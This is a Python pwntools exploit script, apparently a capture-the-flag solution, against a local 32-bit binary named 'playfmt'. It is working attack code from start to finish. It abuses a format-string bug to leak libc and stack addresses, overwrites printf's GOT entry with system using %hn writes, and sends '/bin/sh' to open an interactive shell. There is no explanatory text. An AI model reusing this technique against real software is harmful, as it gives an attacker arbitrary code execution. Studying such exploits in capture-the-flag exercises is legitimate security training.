#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.arch = 'i386'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

io = process("./playfmt")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
elf = ELF("./playfmt")

io.send("..%8$p....%6$p..\0")
io.recvuntil("..")
libc.address = int(io.recvuntil("..", drop = True), 16) - libc.sym['_IO_2_1_stdout_']
success("libc.address -> {:#x}".format(libc.address))
io.recvuntil("..")
stack = int(io.recvuntil("..", drop = True), 16) - 0x28
success("stack -> {:#x}".format(stack))

io.send("%{}c%6$hhn".format((stack + 0x1c) & 0xff))

gdb.attach(io, "b *do_fmt+64\nc")
io.send("%{}c%10$hn\0".format(elf.got['printf'] & 0xffff))

io.send("%{}c%7$hn\0".format(libc.sym['system'] & 0xffff))

io.send("/bin/sh\0")

io.interactive()
io.close()
